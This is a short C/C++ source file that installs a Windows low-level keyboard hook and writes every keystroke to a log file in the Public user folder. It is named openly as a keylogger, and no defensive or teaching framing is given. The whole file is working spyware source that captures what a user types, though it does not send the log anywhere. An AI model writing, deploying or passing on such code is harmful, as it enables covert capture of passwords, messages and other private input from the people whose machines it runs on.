

#include <stdio.h>

#ifdef _WIN32
    #include "keylogger.h"    
    #include <windows.h>
    #include <fstream>

#else 
    #include <unistd.h>
#endif

#ifdef _WIN32
const char keyloggerfile[256] = "C:\\Users\\Public\\log.txt";
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    int keyCount = 0;
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
        FILE* file;
        fopen_s(&file, keyloggerfile, "a");
        if (file != NULL) {
            fprintf(file, "%c", vkCode);
            fclose(file);
        }
        keyCount++;
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void* StartWindowsKeylogger(void* arg) {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    // wait for events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    // delete hook
    UnhookWindowsHookEx(hook);
    return NULL;
}
#endif